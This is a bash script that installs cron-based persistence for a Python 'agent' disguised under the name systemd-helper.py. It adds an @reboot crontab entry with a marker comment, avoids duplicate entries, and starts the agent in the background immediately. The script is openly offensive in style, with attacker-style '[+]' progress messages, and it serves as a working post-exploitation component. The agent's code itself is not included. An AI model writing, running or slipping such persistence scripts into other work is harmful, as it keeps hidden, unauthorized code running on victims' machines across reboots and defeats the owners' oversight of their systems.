#!/bin/bash

AGENT_PATH="$HOME/systemd-helper.py"
CRON_MARKER="# system-helper-cron"

echo "[+] Installing cron persistence..."

# Check if agent exists
if [ ! -f "$AGENT_PATH" ]; then
    echo "[-] systemd-helper.py not found in home directory!"
    exit 1
fi

# Add cron job (avoid duplicates)
(crontab -l 2>/dev/null | grep -v "$CRON_MARKER"; \
echo "@reboot /usr/bin/python $AGENT_PATH & $CRON_MARKER") | crontab -

echo "[+] Cron job installed!"

# Show current crontab
echo "[+] Current crontab:"
crontab -l

# Start agent immediately
echo "[+] Starting agent now..."
/usr/bin/python $AGENT_PATH &

echo "[+] Done!"